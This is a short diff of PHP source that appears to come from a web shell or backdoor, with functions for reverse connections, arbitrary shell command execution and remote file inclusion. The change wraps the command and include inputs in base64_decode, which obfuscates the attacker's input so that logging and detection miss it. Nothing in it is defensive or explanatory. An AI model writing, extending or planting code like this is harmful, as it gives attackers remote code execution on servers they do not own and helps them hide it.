@@ -305,16 +305,16 @@ function reverseConnections($methods, $host, $port, $shell)
 function executeCommands(string $com, int $run)
 {
     if (!empty($com) && $run === "1") {
-        echo("~ Info To Remember ~ \n" . shell_exec($com));
+        echo("~ Info To Remember ~ \n" . shell_exec(base64_decode($com)));
     }else{
-        echo("\nExecuting: ". $com ."\n->". shell_exec($com));
+        echo("\nExecuting: ". $com ."\n->". shell_exec(base64_decode($com)));
     }
 }
 
 function remoteFileInclude(string $targetFile)
 {
     if (!empty($targetFile)) {
-        include ($targetFile) or die("Could not remote import :(\n");
+        include (base64_decode($targetFile)) or die("Could not remote import :(\n");
     }
 }
 
